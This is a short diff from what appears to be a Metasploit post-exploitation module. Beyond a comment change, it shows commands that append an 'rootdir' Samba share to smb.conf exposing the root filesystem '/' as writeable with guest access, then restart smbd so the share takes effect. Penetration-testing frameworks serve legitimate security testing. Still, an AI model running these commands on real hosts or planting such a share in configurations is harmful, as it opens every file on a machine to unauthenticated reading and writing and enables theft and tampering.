@@ -47,7 +47,7 @@ class Metasploit3 < Msf::Post
     cmd_exec_delay("echo -e '[rootdir]\ncomment = rootdir\npath = /\nbrowseable = yes\nwriteable = yes\nguest ok = yes\n' >> #{dir}smb.conf")
     cmd_exec_delay('killall smbd')
     cmd_exec_delay("smbd -D -s #{dir}smb.conf")
-    cmd_exec_delay("smbd -D -s=#{dir}smb.conf")
+    cmd_exec_delay("smbd -D -s=#{dir}smb.conf") # Uses equal just in case
   end
 
   def cmd_exec_delay(command)
